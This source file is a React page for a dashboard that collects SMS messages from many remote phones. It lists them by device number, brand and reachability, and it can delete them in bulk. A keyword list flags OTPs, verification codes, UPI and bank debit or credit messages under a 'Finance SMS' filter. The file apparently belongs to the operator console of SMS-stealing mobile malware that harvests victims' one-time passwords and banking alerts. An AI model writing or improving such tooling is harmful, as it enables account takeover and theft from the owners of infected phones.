// src/pages/SmsHistoryPage.tsx
import { useCallback, useEffect, useMemo, useState, type ReactNode } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import type { SmsDoc } from "../types";
import {
  listNotificationDevices,
  listDeviceNotifications,
  deleteDeviceNotifications,
  deleteAllNotifications,
} from "../services/api/sms";
import { getDevices } from "../services/api/devices";
import { changeDeletePassword, getDeletePasswordStatus } from "../services/api/admin";
import { ENV, apiHeaders } from "../config/constants";
import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";
import wsService from "../services/ws/wsService";
import Modal from "../components/ui/Modal";
import {
  pickLastSeenAt,
  computeReachability,
  getReachabilityLabel,
  getReachabilityPillClasses,
  type ReachabilityStatus,
} from "../utils/reachability";

type SmsWithDevice = SmsDoc & { _deviceId?: string };
type DeleteModalMode = "delete" | "change";
type DeleteAction =
  | { type: "single_sms"; sms: SmsWithDevice }
  | { type: "device_sms"; deviceId: string }
  | { type: "all_sms" }
  | null;

function getTimestamp(m: any): number {
  const t = m?.timestamp ?? m?.time ?? m?.createdAt ?? m?.date;
  if (typeof t === "number") return t;
  if (typeof t === "string") {
    const n = Number(t);
    if (!Number.isNaN(n)) return n;
    const d = Date.parse(t);
    if (!Number.isNaN(d)) return d;
  }
  return 0;
}

function getId(m: any): string {
  return String(m?._id ?? m?.id ?? `${getTimestamp(m)}-${m?.sender ?? ""}-${m?.receiver ?? ""}-${m?.title ?? ""}`);
}

function extractDeviceId(m: any): string | null {
  const d = m?._deviceId ?? m?.deviceId ?? m?.device ?? m?.device_id ?? m?.deviceID ?? null;
  if (!d) return null;
  const s = String(d).trim();
  return s.length ? s : null;
}

function safeStr(v: any): string {
  return String(v ?? "").trim();
}

function pickDeviceId(d: any): string {
  return safeStr(d?.deviceId || d?.uniqueid || d?.uniqueId || d?.uid || "");
}

function pickBrand(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.brand || meta.manufacturer || d?.brand || "Unknown Brand");
}

const FINANCE_KEYWORDS = [
  "credit", "debit", "bank", "balance", "transaction", "txn", "upi", "amount",
  "a/c", "code", "inr", "₹", "paid", "withdrawn", "deposited", "statement",
  "card", "bill", "valid", "otp", "one time password", "verification code",
  "debited", "credited", "received", "payment",
].map((s) => s.toLowerCase());

const DAY_FILTER_OPTIONS = [
  { label: "1 day", value: 1 },
  { label: "2 days", value: 2 },
  { label: "3 days", value: 3 },
  { label: "4 days", value: 4 },
  { label: "5 days", value: 5 },
  { label: "6 days", value: 6 },
  { label: "7 days", value: 7 },
] as const;

function isFinanceSms(m: any) {
  if (!m) return false;
  const title = safeStr(m.title || "").toLowerCase();
  const body = safeStr(m.body || "").toLowerCase();
  for (const kw of FINANCE_KEYWORDS) {
    if (title.includes(kw) || body.includes(kw)) return true;
  }
  return false;
}

function SurfaceCard({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <div
      className={[
        "rounded-[24px] border border-slate-200 bg-white/92 shadow-[0_8px_24px_rgba(15,23,42,0.06)]",
        className,
      ].join(" ")}
    >
      {children}
    </div>
  );
}

async function tryDelete(url: string, body?: any) {
  const res = await axios.delete(url, {
    headers: apiHeaders(),
    timeout: 12000,
    data: body,
  });
  return res.data;
}

export default function SmsHistoryPage() {
  const navigate = useNavigate();

  const [deviceIds, setDeviceIds] = useState<string[]>([]);
  const [allMessages, setAllMessages] = useState<SmsWithDevice[]>([]);

  const [loadingDevices, setLoadingDevices] = useState(false);
  const [loadingMessages, setLoadingMessages] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // ── CHANGED: reachability instead of online boolean ──
  const [deviceMetaMap, setDeviceMetaMap] = useState<
    Record<string, { displayNumber: number; reachability: ReachabilityStatus; brand?: string }>
  >({});

  const [financeOnly, setFinanceOnly] = useState(false);
  const [dayFilter, setDayFilter] = useState<number | "">("");
  const [searchInput, setSearchInput] = useState("");
  const [searchTerm, setSearchTerm] = useState("");

  const [deleteModalOpen, setDeleteModalOpen] = useState(false);
  const [deleteModalMode, setDeleteModalMode] = useState<DeleteModalMode>("delete");
  const [deleteAction, setDeleteAction] = useState<DeleteAction>(null);
  const [deletePasswordSet, setDeletePasswordSet] = useState<boolean | null>(null);
  const [deletePassword, setDeletePassword] = useState("");
  const [deleteBusy, setDeleteBusy] = useState(false);
  const [deleteError, setDeleteError] = useState<string | null>(null);
  const [deleteSuccess, setDeleteSuccess] = useState<string | null>(null);
  const [changeCurrentPassword, setChangeCurrentPassword] = useState("");
  const [changeNewPassword, setChangeNewPassword] = useState("");
  const [changeConfirmPassword, setChangeConfirmPassword] = useState("");
  const [deletingKey, setDeletingKey] = useState<string>("");

  const loadDeletePasswordStatus = useCallback(async () => {
    try {
      const res = await getDeletePasswordStatus();
      setDeletePasswordSet(!!res.isSet);
    } catch (e) {
      console.warn("loadDeletePasswordStatus failed", e);
      setDeletePasswordSet(null);
    }
  }, []);

  async function loadDevices() {
    setLoadingDevices(true);
    setError(null);
    try {
      const ids = await listNotificationDevices();
      const clean = (ids || []).map((i: any) => String(i || "").trim()).filter(Boolean);
      setDeviceIds(clean);
      return clean;
    } catch (e) {
      console.error("loadDevices failed", e);
      setError("Failed to load notification devices");
      setDeviceIds([]);
      return [];
    } finally {
      setLoadingDevices(false);
    }
  }

  // ── CHANGED: uses reachability instead of status.online ──
  async function loadDevicesMeta() {
    try {
      const list = await getDevices();
      const arr = Array.isArray(list) ? list : [];

      const normalized = arr.map((d: any) => {
        const id = pickDeviceId(d) || "unknown";
        const lastSeenAt = pickLastSeenAt(d);
        const reachability = computeReachability(lastSeenAt);
        return { raw: d, deviceId: id, reachability };
      });

      normalized.reverse();

      const total = normalized.length;
      const meta: Record<string, { displayNumber: number; reachability: ReachabilityStatus; brand?: string }> = {};

      for (let i = 0; i < normalized.length; i++) {
        const displayNumber = total - i;
        const item = normalized[i];
        meta[item.deviceId] = { displayNumber, reachability: item.reachability, brand: pickBrand(item.raw) };
      }

      setDeviceMetaMap(meta);
    } catch (e) {
      console.error("loadDevicesMeta failed", e);
      setDeviceMetaMap({});
    }
  }

  async function loadAllMessages(devices?: string[]) {
    setLoadingMessages(true);
    setError(null);

    try {
      const ids = devices ?? deviceIds;
      if (!ids || ids.length === 0) {
        setAllMessages([]);
        return;
      }

      const results = await Promise.all(
        ids.slice(0, 80).map(async (id) => {
          try {
            const list = await listDeviceNotifications(id);
            const arr = (list || []) as SmsDoc[];
            return arr.map((m: any) => ({ ...(m || {}), _deviceId: id })) as SmsWithDevice[];
          } catch (err) {
            console.warn("loadAllMessages device failed", id, err);
            return [] as SmsWithDevice[];
          }
        }),
      );

      const merged = results.flat().sort((a: any, b: any) => getTimestamp(b) - getTimestamp(a));
      setAllMessages(merged);
    } catch (e) {
      console.error("loadAllMessages failed", e);
      setError("Failed to load messages");
      setAllMessages([]);
    } finally {
      setLoadingMessages(false);
    }
  }

  function resetDeleteModalState() {
    setDeleteModalMode("delete");
    setDeleteAction(null);
    setDeletePassword("");
    setDeleteBusy(false);
    setDeleteError(null);
    setDeleteSuccess(null);
    setChangeCurrentPassword("");
    setChangeNewPassword("");
    setChangeConfirmPassword("");
  }

  function closeDeleteModal() {
    setDeleteModalOpen(false);
    resetDeleteModalState();
  }

  async function openDeleteModal(action: DeleteAction) {
    setDeleteAction(action);
    setDeleteModalMode("delete");
    setDeletePassword("");
    setDeleteBusy(false);
    setDeleteError(null);
    setDeleteSuccess(null);
    setChangeCurrentPassword("");
    setChangeNewPassword("");
    setChangeConfirmPassword("");
    setDeleteModalOpen(true);
    await loadDeletePasswordStatus();
  }

  async function handleDeleteDevice(deviceId: string) {
    await openDeleteModal({ type: "device_sms", deviceId });
  }

  async function handleDeleteSingleMessage(m: SmsWithDevice) {
    const deviceId = extractDeviceId(m);
    if (!deviceId) {
      alert("Device id missing");
      return;
    }
    await openDeleteModal({ type: "single_sms", sms: m });
  }

  async function handleDeleteAll() {
    await openDeleteModal({ type: "all_sms" });
  }

  function openDeviceFromMessage(m: SmsWithDevice) {
    const deviceId = extractDeviceId(m);
    if (!deviceId) return;
    navigate(`/devices/${encodeURIComponent(deviceId)}`);
  }

  function handleApplySearch(e?: React.FormEvent) {
    if (e) e.preventDefault();
    setSearchTerm(searchInput.trim());
  }

  function handleClearSearch() {
    setSearchInput("");
    setSearchTerm("");
  }

  async function runDeleteAction(password: string) {
    if (!deleteAction) return;

    const trimmed = password.trim();
    if (!trimmed) { setDeleteError("Password is required"); return; }
    if (trimmed.length < 4) { setDeleteError("Password must be at least 4 digits"); return; }

    setDeleteBusy(true);
    setDeleteError(null);
    setDeleteSuccess(null);

    try {
      if (deleteAction.type === "single_sms") {
        const sms = deleteAction.sms;
        const deviceId = extractDeviceId(sms);
        const messageId = safeStr((sms as any)?._id || (sms as any)?.id);
        if (!deviceId || !messageId) throw new Error("SMS id or device id missing");

        setDeletingKey(`single:${messageId}`);
        const url = `${ENV.API_BASE}/api/devices/notifications/device/${encodeURIComponent(deviceId)}/${encodeURIComponent(messageId)}`;
        await tryDelete(url, { password: trimmed, uniqueid: deviceId, deviceId, id: messageId, _id: messageId });

        setAllMessages((prev) => prev.filter((item) => getId(item) !== getId(sms)));
        setDeleteSuccess(deletePasswordSet ? "SMS deleted" : "Password created and SMS deleted");
      } else if (deleteAction.type === "device_sms") {
        const deviceId = deleteAction.deviceId;
        setDeletingKey(`device:${deviceId}`);
        await deleteDeviceNotifications(deviceId, trimmed);

        setAllMessages((prev) => prev.filter((m) => extractDeviceId(m) !== deviceId));
        const ids = await loadDevices();
        await loadDevicesMeta();
        if (!ids.includes(deviceId)) setDeviceIds(ids);

        setDeleteSuccess(deletePasswordSet ? `All SMS deleted for ${deviceId}` : `Password created and all SMS deleted for ${deviceId}`);
      } else if (deleteAction.type === "all_sms") {
        setDeletingKey("all");
        await deleteAllNotifications(trimmed as any);
        setDeviceIds([]);
        setAllMessages([]);
        await loadDevicesMeta();
        setDeleteSuccess(deletePasswordSet ? "All notifications deleted" : "Password created and all notifications deleted");
      }

      setDeletePasswordSet(true);
      setTimeout(() => { closeDeleteModal(); }, 700);
    } catch (e: any) {
      console.error("runDeleteAction failed", e);
      setDeleteError(safeStr(e?.response?.data?.error || e?.message || "Delete failed"));
    } finally {
      setDeleteBusy(false);
      setDeletingKey("");
    }
  }

  async function handleSubmitDeletePassword(e?: React.FormEvent) {
    if (e) e.preventDefault();
    await runDeleteAction(deletePassword);
  }

  async function handleChangeDeletePassword(e?: React.FormEvent) {
    if (e) e.preventDefault();
    const currentPassword = changeCurrentPassword.trim();
    const newPassword = changeNewPassword.trim();
    const confirmPassword = changeConfirmPassword.trim();

    if (!currentPassword) { setDeleteError("Current password is required"); return; }
    if (!newPassword) { setDeleteError("New password is required"); return; }
    if (newPassword.length < 4) { setDeleteError("New password must be at least 4 digits"); return; }
    if (newPassword !== confirmPassword) { setDeleteError("Confirm password does not match"); return; }

    setDeleteBusy(true);
    setDeleteError(null);
    setDeleteSuccess(null);

    try {
      const res = await changeDeletePassword(currentPassword, newPassword);
      if (!res.success) { setDeleteError(res.error || "Failed to change password"); return; }
      setDeletePasswordSet(true);
      setChangeCurrentPassword("");
      setChangeNewPassword("");
      setChangeConfirmPassword("");
      setDeletePassword("");
      setDeleteSuccess("Password changed successfully");
      setDeleteModalMode("delete");
    } catch (e: any) {
      console.error("change delete password failed", e);
      setDeleteError(safeStr(e?.response?.data?.error || e?.message || "Failed to change password"));
    } finally {
      setDeleteBusy(false);
    }
  }

  useEffect(() => {
    (async () => {
      const ids = await loadDevices();
      await loadAllMessages(ids);
      await loadDevicesMeta();
      await loadDeletePasswordStatus();
    })();

    wsService.connect();

    const off = wsService.onMessage((msg) => {
      try {
        if (!msg || msg.type !== "event") return;

        if (msg.event === "notification") {
          const deviceId = safeStr(msg.deviceId || msg?.data?.deviceId);
          if (!deviceId) return;

          const sms: SmsWithDevice = {
            ...(msg?.data || {}),
            _deviceId: deviceId,
            deviceId,
            _id: msg?.data?.id || msg?.data?._id || `${Date.now()}_${Math.random().toString(16).slice(2)}`,
            timestamp: Number(msg?.data?.timestamp || msg?.timestamp || Date.now()),
          };

          setDeviceIds((prev) => {
            if (prev.includes(deviceId)) return prev;
            return [deviceId, ...prev];
          });

          setAllMessages((prev) => {
            const next = [sms, ...prev];
            next.sort((a, b) => getTimestamp(b) - getTimestamp(a));
            return next;
          });
          return;
        }

        if (msg.event === "notification:deleted") {
          const deviceId = safeStr(msg?.data?.deviceId || msg.deviceId);
          const smsId = safeStr(msg?.data?.id || msg?.data?._id);
          if (!smsId) return;

          setAllMessages((prev) =>
            prev.filter((m) => {
              const mid = safeStr((m as any)?._id || (m as any)?.id);
              if (mid !== smsId) return true;
              if (deviceId && extractDeviceId(m) && extractDeviceId(m) !== deviceId) return true;
              return false;
            }),
          );
          return;
        }

        // ── CHANGED: handle device:lastSeen instead of status ──
        if (msg.event === "device:lastSeen" || msg.event === "device:upsert") {
          const deviceId = safeStr(msg.deviceId || msg?.data?.deviceId);
          if (!deviceId) return;

          const lastSeenData = msg?.data?.lastSeen || msg?.data;
          const lastSeenAt = Number(lastSeenData?.at || msg?.data?.timestamp || Date.now());
          const reachability = computeReachability(lastSeenAt);

          setDeviceMetaMap((prev) => {
            const existing = prev[deviceId];
            if (!existing) return prev;
            return {
              ...prev,
              [deviceId]: { ...existing, reachability },
            };
          });
          return;
        }

        // Legacy: still handle "status" event for backward compat
        if (msg.event === "status") {
          const deviceId = safeStr(msg.deviceId || msg?.data?.deviceId);
          if (!deviceId) return;
          const ts = Number(msg?.data?.timestamp || Date.now());
          const reachability = computeReachability(ts);

          setDeviceMetaMap((prev) => {
            const existing = prev[deviceId];
            if (!existing) return prev;
            return {
              ...prev,
              [deviceId]: { ...existing, reachability },
            };
          });
          return;
        }

        if (msg.event === "device:delete") {
          const deviceId = safeStr(msg?.data?.deviceId || msg.deviceId);
          if (!deviceId) return;

          setDeviceIds((prev) => prev.filter((id) => id !== deviceId));
          setAllMessages((prev) => prev.filter((m) => extractDeviceId(m) !== deviceId));
          setDeviceMetaMap((prev) => {
            const copy = { ...prev };
            delete copy[deviceId];
            return copy;
          });
        }
      } catch {
        // ignore
      }
    });

    return () => { off(); };
  }, [loadDeletePasswordStatus]);

  const financeCount = useMemo(() => allMessages.filter((m) => isFinanceSms(m)).length, [allMessages]);

  const visibleMessages = useMemo(() => {
    const financeFiltered = financeOnly ? allMessages.filter((m) => isFinanceSms(m)) : allMessages;

    const dayFiltered =
      dayFilter === ""
        ? financeFiltered
        : financeFiltered.filter((m) => {
            const cutoff = Date.now() - Number(dayFilter) * 24 * 60 * 60 * 1000;
            const ts = getTimestamp(m);
            return ts > 0 && ts >= cutoff;
          });

    const q = searchTerm.trim().toLowerCase();
    if (!q) return dayFiltered;

    return dayFiltered.filter((m: any) => {
      const deviceId = safeStr(extractDeviceId(m) || "");
      const title = safeStr(m.title || "");
      const sender = safeStr(m.sender || m.senderNumber || "");
      const receiver = safeStr(m.receiver || "");
      const body = safeStr(m.body || "");
      const brand = safeStr(deviceId ? deviceMetaMap[deviceId]?.brand || "" : "");
      const haystack = [deviceId, title, sender, receiver, body, brand].join(" ").toLowerCase();
      return haystack.includes(q);
    });
  }, [allMessages, financeOnly, dayFilter, searchTerm, deviceMetaMap]);

  const uniqueDevicesInMessages = useMemo(() => {
    const set = new Set<string>();
    for (const m of allMessages) {
      const d = extractDeviceId(m);
      if (d) set.add(d);
    }
    return set.size;
  }, [allMessages]);

  const deleteModalTitle = useMemo(() => {
    if (deleteModalMode === "change") return "Change Delete Password";
    if (deleteAction?.type === "single_sms") return "Enter Password to Delete SMS";
    if (deleteAction?.type === "device_sms") return "Enter Password to Delete Device SMS";
    return "Enter Password to Delete All Notifications";
  }, [deleteAction, deleteModalMode]);

  const deleteHelpText = useMemo(() => {
    if (deleteModalMode === "change") return "Enter your current password and choose a new password. New password must be at least 4 digits.";
    if (deletePasswordSet === false) return "No delete password is set yet. The password you enter now will be saved and used for future device/SMS deletes.";
    return "Enter your delete password to continue. The same password is used for both device delete and SMS delete.";
  }, [deleteModalMode, deletePasswordSet]);

  const deleteActionLabel = useMemo(() => {
    if (deleteAction?.type === "single_sms") return "Delete SMS";
    if (deleteAction?.type === "device_sms") return "Delete Device SMS";
    return "Delete All Notifications";
  }, [deleteAction]);

  return (
    <AnimatedAppBackground>
      <div className="mx-auto w-full max-w-[420px] px-3 pb-24 pt-4">
        <SurfaceCard className="p-4">
          <div className="flex items-start justify-between gap-3">
            <div className="min-w-0">
              <div className="text-[22px] font-extrabold tracking-tight text-slate-900">Notifications / SMS</div>
              <div className="text-[12px] text-slate-500">Incoming SMS stored from devices (tap SMS to open its device)</div>
              <div className="mt-1 text-[11px] text-slate-400">
                Devices: {loadingDevices ? "…" : deviceIds.length} • In list: {uniqueDevicesInMessages}
              </div>
            </div>

            <div className="flex items-center gap-2 shrink-0">
              <button
                onClick={async () => {
                  const ids = await loadDevices();
                  await loadAllMessages(ids);
                  await loadDevicesMeta();
                  await loadDeletePasswordStatus();
                }}
                className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-700 hover:bg-slate-50"
                type="button"
              >
                Refresh
              </button>

              <button
                onClick={handleDeleteAll}
                disabled={deleteBusy && deletingKey === "all"}
                className="h-10 rounded-2xl border border-rose-200 bg-rose-50 px-4 text-rose-700 hover:bg-rose-100 disabled:cursor-not-allowed disabled:opacity-60"
                type="button"
              >
                {deleteBusy && deletingKey === "all" ? "Deleting..." : "Delete All"}
              </button>
            </div>
          </div>

          <div className="mt-3 flex items-center justify-end gap-2">
            <button
              onClick={() => setFinanceOnly((s) => !s)}
              className={[
                "h-9 rounded-2xl border px-3 text-[13px] font-semibold transition",
                financeOnly
                  ? "border-amber-200 bg-amber-50 text-amber-700"
                  : "border-slate-200 bg-white text-slate-700 hover:bg-slate-50",
              ].join(" ")}
              type="button"
              aria-pressed={financeOnly}
            >
              Finance SMS ({financeCount})
            </button>
          </div>

          <div className="mt-4 rounded-3xl border border-slate-200 bg-slate-50 p-4">
            <div className="mb-2 text-[12px] text-slate-500">Search SMS by device id, sender, receiver, title, body, etc.</div>

            <form onSubmit={handleApplySearch} className="flex items-center gap-2">
              <input
                placeholder="Search device id, sender, receiver, body..."
                value={searchInput}
                onChange={(e) => setSearchInput(e.target.value)}
                className="h-11 min-w-0 flex-1 rounded-2xl border border-slate-200 bg-white px-4 text-[14px] text-slate-900 placeholder:text-slate-400 outline-none focus:border-sky-300 focus:ring-2 focus:ring-sky-100"
              />
              <button type="submit" className="h-11 shrink-0 rounded-2xl bg-[var(--brand)] px-4 text-[14px] font-bold text-white">Search</button>
              {(searchInput || searchTerm) && (
                <button type="button" onClick={handleClearSearch} className="h-11 shrink-0 rounded-2xl border border-slate-200 bg-white px-4 text-[14px] font-bold text-slate-700 hover:bg-slate-50">Clear</button>
              )}
            </form>

            <div className="mt-3">
              <div className="mb-2 text-[12px] text-slate-500">Filter by days</div>
              <div className="w-full">
                <select
                  value={dayFilter === "" ? "" : String(dayFilter)}
                  onChange={(e) => { const v = e.target.value.trim(); setDayFilter(v === "" ? "" : Number(v)); }}
                  className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] text-slate-900 outline-none focus:border-sky-300 focus:ring-2 focus:ring-sky-100"
                >
                  <option value="">Filter</option>
                  {DAY_FILTER_OPTIONS.map((opt) => (
                    <option key={opt.value} value={opt.value}>Last {opt.label}</option>
                  ))}
                </select>
              </div>
            </div>
          </div>

          <div className="mt-4 space-y-3">
            {loadingDevices || loadingMessages ? (
              <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center text-slate-500">Loading…</div>
            ) : deviceIds.length === 0 ? (
              <div className="rounded-3xl border border-slate-200 bg-white p-6 text-center text-slate-500">No devices with notifications.</div>
            ) : visibleMessages.length === 0 ? (
              <div className="rounded-3xl border border-slate-200 bg-white p-6 text-center text-slate-500">No messages.</div>
            ) : (
              visibleMessages.map((m: any) => {
                const deviceId = extractDeviceId(m);
                const canOpen = Boolean(deviceId);

                const title = safeStr(m.title || "New SMS");
                const sender = safeStr(m.sender || m.senderNumber || "unknown");
                const receiver = safeStr(m.receiver || "");
                const body = safeStr(m.body || "");
                const ts = getTimestamp(m);

                const meta = deviceId ? deviceMetaMap[deviceId] : undefined;
                const finance = isFinanceSms(m);
                const messageId = safeStr((m as any)?._id || (m as any)?.id);
                const isDeletingSingle = deletingKey === `single:${messageId}`;
                const isDeletingDevice = !!deviceId && deletingKey === `device:${deviceId}`;

                // ── CHANGED: reachability pill instead of online/offline ──
                const pillLabel = meta ? getReachabilityLabel(meta.reachability) : "";
                const pillClasses = meta ? getReachabilityPillClasses(meta.reachability) : "";

                return (
                  <div key={getId(m)} className="rounded-[22px] border border-slate-200 bg-white p-4 text-left shadow-[0_6px_20px_rgba(15,23,42,0.05)]">
                    <div className="flex items-start justify-between gap-3">
                      <button
                        onClick={() => (canOpen ? openDeviceFromMessage(m) : undefined)}
                        className={["min-w-0 flex-1 text-left transition", canOpen ? "hover:opacity-90 active:scale-[0.995]" : "cursor-default opacity-85"].join(" ")}
                        title={canOpen ? "Open this device" : "Device id missing"}
                        type="button"
                      >
                        <div className="flex items-center gap-2 min-w-0">
                          <div className={["truncate min-w-0 text-[14px] font-extrabold", finance ? "text-rose-700" : "text-slate-900"].join(" ")}>{title}</div>
                          {meta ? (
                            <div className="flex h-7 w-7 flex-shrink-0 items-center justify-center rounded-full bg-slate-900 text-sm font-extrabold text-white" title={`#${meta.displayNumber}`} aria-hidden={false}>{meta.displayNumber}</div>
                          ) : null}
                        </div>
                        <div className="mt-1 truncate text-[12px]" style={{ color: finance ? "rgb(190 24 93)" : undefined }}>
                          From: {sender} {receiver ? `→ ${receiver}` : ""}
                        </div>
                        {deviceId ? <div className="mt-1 truncate text-[11px] text-slate-400">Device: {deviceId}</div> : null}
                      </button>

                      <div className="shrink-0 flex flex-col items-end gap-2">
                        {meta ? (
                          <span className={["rounded-full border px-3 py-1 text-[12px] font-extrabold", pillClasses].join(" ")}>{pillLabel}</span>
                        ) : (
                          <div style={{ height: 34 }} />
                        )}
                        <div className="text-[11px] text-slate-400">{ts ? new Date(ts).toLocaleString() : "-"}</div>
                        <button
                          onClick={() => handleDeleteSingleMessage(m)}
                          disabled={isDeletingSingle}
                          className="rounded-2xl border border-rose-200 bg-rose-50 px-3 py-2 text-[12px] font-semibold text-rose-700 hover:bg-rose-100 disabled:cursor-not-allowed disabled:opacity-60"
                          type="button"
                        >
                          {isDeletingSingle ? "Deleting..." : "Delete"}
                        </button>
                      </div>
                    </div>

                    <button
                      onClick={() => (canOpen ? openDeviceFromMessage(m) : undefined)}
                      className={["mt-3 w-full text-left", canOpen ? "hover:opacity-90 active:scale-[0.995]" : "cursor-default"].join(" ")}
                      type="button"
                      title={canOpen ? "Open this device" : "Device id missing"}
                    >
                      {body ? (
                        <div className={["whitespace-pre-wrap break-words text-[13px]", finance ? "text-rose-700" : "text-slate-800"].join(" ")}>{body}</div>
                      ) : (
                        <div className="text-[13px] text-slate-400">—</div>
                      )}
                    </button>

                    {deviceId ? (
                      <div className="mt-3 flex justify-end">
                        <button
                          onClick={() => handleDeleteDevice(deviceId)}
                          disabled={isDeletingDevice}
                          className="rounded-2xl border border-rose-200 bg-rose-50 px-3 py-2 text-[12px] font-semibold text-rose-700 hover:bg-rose-100 disabled:cursor-not-allowed disabled:opacity-60"
                          type="button"
                          title={`Delete all notifications for ${deviceId}`}
                        >
                          {isDeletingDevice ? "Deleting device SMS..." : "Delete Device SMS"}
                        </button>
                      </div>
                    ) : null}
                  </div>
                );
              })
            )}
          </div>

          {error && (
            <div className="mt-4 rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">{error}</div>
          )}

          {deviceIds.length > 0 && (
            <div className="mt-5 rounded-3xl border border-slate-200 bg-slate-50 p-4">
              <div className="mb-3 text-[12px] text-slate-500">Quick actions</div>
              <div className="flex flex-wrap gap-2">
                {deviceIds.slice(0, 10).map((d) => {
                  const isDeletingDevice = deletingKey === `device:${d}`;
                  return (
                    <button
                      key={d}
                      onClick={() => handleDeleteDevice(d)}
                      disabled={isDeletingDevice}
                      className="rounded-2xl border border-rose-200 bg-rose-50 px-3 py-2 text-[12px] text-rose-700 hover:bg-rose-100 disabled:cursor-not-allowed disabled:opacity-60"
                      type="button"
                      title={`Delete notifications for ${d}`}
                    >
                      {isDeletingDevice ? "Deleting..." : `Delete ${d.slice(0, 10)}…`}
                    </button>
                  );
                })}
                {deviceIds.length > 10 && (
                  <div className="self-center text-[12px] text-slate-400">+{deviceIds.length - 10} more</div>
                )}
              </div>
            </div>
          )}
        </SurfaceCard>
      </div>

      {/* Delete Modal */}
      <Modal open={deleteModalOpen} onClose={closeDeleteModal} title={deleteModalTitle}>
        {deleteModalMode === "delete" ? (
          <form onSubmit={handleSubmitDeletePassword} className="space-y-4">
            <div className="rounded-2xl border border-amber-200 bg-amber-50 px-3 py-3 text-sm leading-6 text-slate-700">{deleteHelpText}</div>

            {deleteAction?.type === "single_sms" ? (
              <div className="rounded-2xl border border-slate-200 bg-slate-50 px-3 py-3 text-[12px] text-slate-600">
                <div className="font-bold text-slate-900">Selected SMS</div>
                <div className="mt-1 break-words">{safeStr(deleteAction.sms?.title || "New SMS") || "New SMS"}</div>
                {extractDeviceId(deleteAction.sms) ? <div className="mt-1 text-slate-500">Device: {extractDeviceId(deleteAction.sms)}</div> : null}
              </div>
            ) : deleteAction?.type === "device_sms" ? (
              <div className="rounded-2xl border border-slate-200 bg-slate-50 px-3 py-3 text-[12px] text-slate-600">
                Delete all notifications for device <span className="font-bold text-slate-900">{deleteAction.deviceId}</span>.
              </div>
            ) : deleteAction?.type === "all_sms" ? (
              <div className="rounded-2xl border border-slate-200 bg-slate-50 px-3 py-3 text-[12px] text-slate-600">This will delete all notifications for all devices.</div>
            ) : null}

            <div>
              <div className="mb-1 text-xs font-semibold text-slate-600">{deletePasswordSet === false ? "Create Password" : "Password"}</div>
              <input type="password" value={deletePassword} onChange={(e) => setDeletePassword(e.target.value)} placeholder={deletePasswordSet === false ? "Enter new 4-digit password" : "Enter delete password"} className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100" autoFocus />
              <div className="mt-1 text-[11px] text-slate-500">Password must be at least 4 digits.</div>
            </div>

            {deleteError ? <div className="rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">{deleteError}</div> : null}
            {deleteSuccess ? <div className="rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-2 text-sm text-emerald-700">{deleteSuccess}</div> : null}

            <div className="grid grid-cols-1 gap-2 pt-1">
              <button type="submit" disabled={deleteBusy} className="h-11 w-full rounded-2xl bg-[var(--brand)] px-4 text-[14px] font-extrabold text-white disabled:opacity-60">{deleteBusy ? "Processing..." : deleteActionLabel}</button>
              <button type="button" onClick={() => { setDeleteModalMode("change"); setDeleteError(null); setDeleteSuccess(null); }} className="h-11 w-full rounded-2xl border border-slate-200 bg-slate-50 px-4 text-[14px] font-bold text-slate-800">Change Password</button>
              <button type="button" onClick={closeDeleteModal} className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] font-bold text-slate-700">Cancel</button>
            </div>
          </form>
        ) : (
          <form onSubmit={handleChangeDeletePassword} className="space-y-4">
            <div className="rounded-2xl border border-sky-200 bg-sky-50 px-3 py-3 text-sm leading-6 text-slate-700">{deleteHelpText}</div>
            <div><div className="mb-1 text-xs font-semibold text-slate-600">Current Password</div><input type="password" value={changeCurrentPassword} onChange={(e) => setChangeCurrentPassword(e.target.value)} placeholder="Enter current password" className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100" autoFocus /></div>
            <div><div className="mb-1 text-xs font-semibold text-slate-600">New Password</div><input type="password" value={changeNewPassword} onChange={(e) => setChangeNewPassword(e.target.value)} placeholder="Enter new 4-digit password" className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100" /></div>
            <div><div className="mb-1 text-xs font-semibold text-slate-600">Confirm New Password</div><input type="password" value={changeConfirmPassword} onChange={(e) => setChangeConfirmPassword(e.target.value)} placeholder="Confirm new password" className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100" /></div>
            {deleteError ? <div className="rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">{deleteError}</div> : null}
            {deleteSuccess ? <div className="rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-2 text-sm text-emerald-700">{deleteSuccess}</div> : null}
            <div className="grid grid-cols-1 gap-2 pt-1">
              <button type="submit" disabled={deleteBusy} className="h-11 w-full rounded-2xl bg-[var(--brand)] px-4 text-[14px] font-extrabold text-white disabled:opacity-60">{deleteBusy ? "Saving..." : "Save New Password"}</button>
              <button type="button" onClick={() => { setDeleteModalMode("delete"); setDeleteError(null); setDeleteSuccess(null); }} className="h-11 w-full rounded-2xl border border-slate-200 bg-slate-50 px-4 text-[14px] font-bold text-slate-800">Back to Delete</button>
              <button type="button" onClick={closeDeleteModal} className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] font-bold text-slate-700">Cancel</button>
            </div>
          </form>
        )}
      </Modal>
    </AnimatedAppBackground>
  );
}